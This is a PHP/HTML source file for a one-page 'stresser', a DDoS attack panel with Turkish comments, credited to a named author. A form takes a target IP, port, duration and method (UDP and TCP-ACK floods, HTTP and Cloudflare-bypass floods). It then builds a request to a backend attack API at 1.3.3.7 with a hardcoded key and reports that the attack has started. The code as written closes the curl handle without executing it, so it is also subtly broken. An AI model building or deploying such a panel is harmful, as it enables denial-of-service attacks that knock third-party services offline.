<!-- 
Coded by Dogukan Bey 2021*
Tek Sayfalık Stresser Projesi / One Page Stresser Project
İletişim / Contact: Instagram @dogukaan1337
-->
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Dogukan Bey One Page Stresser</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
  <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="wrapper">
	<div>
		<h3><i class="fas fa-users"></i> Dogukan Bey</h3>
	</div>
	<form class="login-form" action="" method="POST">
		<?php 

			if (isset($_POST['saldir'])) {
				$host = htmlspecialchars($_POST['host']);
				$port = htmlspecialchars($_POST['port']);
				$time = htmlspecialchars($_POST['time']);
				$method = htmlspecialchars($_POST['method']);
				if($time <= 300){ // Max saldırı süresini belirler

				$dogukanbey = curl_init();
				curl_setopt($dogukanbey, CURLOPT_URL, "http://1.3.3.7/dogukanbe.php?ip=$host&port=$port&time=$time&method=$method&key=dogukanbey1337");
                curl_setopt($dogukanbey, CURLOPT_TIMEOUT, 5);
                curl_setopt($dogukanbey, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($dogukanbey, CURLOPT_REFERER, "https://google.com");
                curl_setopt($dogukanbey, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($dogukanbey, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($dogukanbey, CURLOPT_POST, true);
                curl_close($dogukanbey);
              	echo "<h4 style=\"color:green; text-align: center;\">"; echo $host; echo " adresine "; echo $time; echo " saniye "; echo $method; echo " methoduyla saldırı başladı!"; echo "</h4>";
               	header("Refresh: 2; url=index.php");
           }else{
           	echo "<h4 style=\"color:red; text-align: center;\">Max 300 saniye saldırabilirsiniz!</h4>";
           	header("Refresh: 2; url=index.php");
          	 }
           }
		 ?>
		<div class="input-field">
			<i class="fas fa-crosshairs"></i>
			<input name="host" type="text" placeholder="&nbsp;" autocomplete="off" />
			<label for="host">IP/Hostname</label>
		</div>
		<div class="input-field">
			<i class="fas fa-code-branch"></i>
			<input name="port" type="text" placeholder="&nbsp;" autocomplete="off" />
			<label for="port">Port</label>
		</div>
		<div class="input-field">
			<i class="fas fa-clock"></i>
			<input name="time" type="text" placeholder="&nbsp;" autocomplete="off" />
			<label for="time">Time</label>
		</div>
		<div class="input-field">
			<i class="fas fa-arrow-alt-circle-right"></i>
			<select name="method" class="input-field i" style="height: 55px; width: 370px;">
				<optgroup label="Layer 4">
					<option value="UDP-MIX">UDP-MIX</option>
					<option value="TS3INIT1">TS3INIT1</option>
					<option value="TCP-ACK">TCP-ACK</option>
				</optgroup>
				<optgroup label="Layer 7">
					<option value="CF-GET">CF-GET</option>
					<option value="CF-POST">CF-POST</option>
					<option value="HTTP-GET">HTTP-GET</option>
					<option value="HTTP-POST">HTTP-POST</option>
				</optgroup>
				<optgroup label="Special Method">
					<option value="special1">Example Special Method 1</option>
					<option value="special2">Example Special Method 2</option>
				</optgroup>
			</select>
		</div>
		<input class="btn-submit" type="submit" name="saldir" value="Send Attack" />
	</form>
</div>
  <script src='https://kit.fontawesome.com/263341f1b6.js'></script>
</body>
</html>
